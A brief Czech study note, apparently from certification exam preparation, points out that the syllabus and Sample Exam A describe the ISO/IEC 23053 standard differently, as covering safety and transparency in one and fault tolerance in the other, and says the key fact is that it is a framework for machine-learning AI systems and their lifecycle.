Drobný rozpor. Sylabus v1.1 u ISO/IEC 23053 píše o bezpečnosti (safety) a transparentnosti. Zdůvodnění v Sample Exam A a dva kurzy uvádějí „fault tolerance“, tedy odolnost proti chybám. Pro zkoušku je podstatné poznat, že 23053 je rámec pro AI systémy se strojovým učením a jejich životní cyklus.
:::
